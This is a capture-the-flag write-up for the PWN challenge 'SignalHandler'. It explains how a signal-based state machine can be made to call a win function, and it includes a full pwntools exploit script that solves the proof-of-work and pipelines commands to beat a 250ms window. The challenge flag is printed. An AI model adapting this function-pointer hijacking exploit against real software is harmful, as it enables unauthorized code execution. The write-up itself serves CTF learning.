# SignalHandler

**Category:** PWN  
**Challenge Description:**

The system listens for signals. Send the right ones in the right order, and it will open up. But timing is everything.

Flag: `KOS{DAF17495D77E42148313EB9E4ACBA1F8}`

## Analysis

The binary implements a signal-based state machine with a `win_flag()` function at `0x401266` (no PIE) that reads `/flag`. The flow:

1. `TARGET <addr>` — stores a function pointer in a stash
2. `SIGNAL` — fires SIGUSR1, the handler promotes the stash to "callable"
3. `INVOKE` — calls the stash if it was promoted, but only within a 250ms window

Six decoy flags are hardcoded in the binary (`SIGKILL_ADMIN_HANDSHAKE`, `WATCHDOG_DISABLED_WITH_ALARM0`, etc.) — none come from `/flag`.

The trick: pipeline all three commands in a single `send()` so `INVOKE` arrives well within the 250ms window.

## Solution

1. Solve the proof-of-work: brute-force a nonce such that `sha256(session + nonce)` starts with 3 zero bytes.
2. Send `LOGIN` to advance the state machine.
3. Pipeline `TARGET`, `SIGNAL`, `INVOKE` in one write.

```python
from pwn import *
import hashlib

r = remote('ctf.kosovacyber.team', 2009)

banner = r.recvuntil(b'stash is reset.\n')
session = next(l.split(b'=')[1].decode() for l in banner.split(b'\n') if b'session=' in l)

def solve_pow(s):
    i = 0
    while True:
        h = hashlib.sha256((s + f'{i:x}').encode()).digest()
        if h[0] == h[1] == h[2] == 0:
            return f'{i:x}'
        i += 1

r.sendline(f'POW {solve_pow(session)}'.encode())
r.recvline()
r.sendline(b'LOGIN')
r.recvline()

win_flag = 0x401266
r.send(f'TARGET {win_flag:x}\nSIGNAL\nINVOKE\n'.encode())
print(r.recvall(timeout=6).decode())
```
